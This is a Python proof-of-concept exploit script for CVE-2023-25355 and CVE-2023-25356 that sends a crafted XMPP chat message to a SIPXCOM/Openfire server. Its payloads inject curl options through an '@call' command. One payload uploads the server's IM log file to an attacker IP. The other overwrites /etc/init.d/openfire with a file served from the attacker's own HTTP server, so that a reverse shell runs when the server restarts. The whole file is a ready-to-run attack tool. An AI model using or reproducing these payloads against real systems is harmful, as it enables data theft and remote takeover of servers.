import xmpp
import argparse
import logging
import os
import threading
import http.server
import socketserver

def send_exploit_message(username, password, target_jid, payload, server_address):
    jid = xmpp.protocol.JID(f"{username}@{server_address}")
    client = xmpp.Client(jid.getDomain(), debug=[])
    
    if not client.connect(server=(server_address, 5222)):
        logging.error("Unable to connect to the server.")
        return
    
    if not client.auth(jid.getNode(), password, resource=jid.getResource()):
        logging.error("Unable to authenticate.")
        return
    
    client.sendInitPresence()
    
    message = xmpp.protocol.Message(body=payload, to=target_jid, typ='chat')
    client.send(message)
    logging.info("Exploit message sent. Check your netcat listener")
    
    client.disconnect()

def start_http_server(file_path, port):
    handler = http.server.SimpleHTTPRequestHandler
    os.chdir(os.path.dirname(file_path))
    httpd = socketserver.TCPServer(("", port), handler)
    logging.info(f"Serving HTTP on port {port}")
    httpd.serve_forever()

def main():
    print(r"""


░██████╗██╗██████╗░██╗░░██╗░█████╗░░█████╗░███╗░░░███╗
██╔════╝██║██╔══██╗╚██╗██╔╝██╔══██╗██╔══██╗████╗░████║
╚█████╗░██║██████╔╝░╚███╔╝░██║░░╚═╝██║░░██║██╔████╔██║
░╚═══██╗██║██╔═══╝░░██╔██╗░██║░░██╗██║░░██║██║╚██╔╝██║
██████╔╝██║██║░░░░░██╔╝╚██╗╚█████╔╝╚█████╔╝██║░╚═╝░██║
╚═════╝░╚═╝╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝

 Additional PoC for CVE-2023-25355 & CVE-2023-25356
 Based on Article from Packet Storm 
    """)

    parser = argparse.ArgumentParser(description="Send XMPP exploit message.")
    parser.add_argument("--username", required=True, help="XMPP username")
    parser.add_argument("--password", required=True, help="XMPP password")
    parser.add_argument("--target_jid", required=True, help="Target JID")
    parser.add_argument("--server_address", required=True, help="XMPP server address")
    parser.add_argument("--payload_option", choices=['1', '2'], required=True, 
                        help=("Payload option: "
                              "1 for retrieving logs (start a netcat listener on port 80 to retrieve logs), "
                              "2 for reverse shell (nc is needed to catch reverse shell upon XMPP server restart)"))
    parser.add_argument("--file", help="File to serve for reverse shell (required for payload option 2)", required=False)
    parser.add_argument("--attack_ip", required=True, help="Your IP address to be used in the payload")
    parser.add_argument("--port", type=int, default=8080, help="Port for HTTP server (default: 8080)")

    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    if args.payload_option == '2' and not args.file:
        parser.error("--file is required for payload option 2")

    if args.payload_option == '1':
        payload = f"@call abc -o /tmp/dummy -d @/opt/openfire/logs/sipxopenfire-im.log http://{args.attack_ip}/abc"
    elif args.payload_option == '2':
        file_path = os.path.abspath(args.file)
        threading.Thread(target=start_http_server, args=(file_path, args.port), daemon=True).start()
        
        payload = f"@call abc -o /tmp/dummy -o /etc/init.d/openfire -X GET http://{args.attack_ip}:{args.port}/{os.path.basename(file_path)} -o /tmp/dummy"
    
    send_exploit_message(args.username, args.password, args.target_jid, payload, args.server_address)

if __name__ == '__main__':
    main()
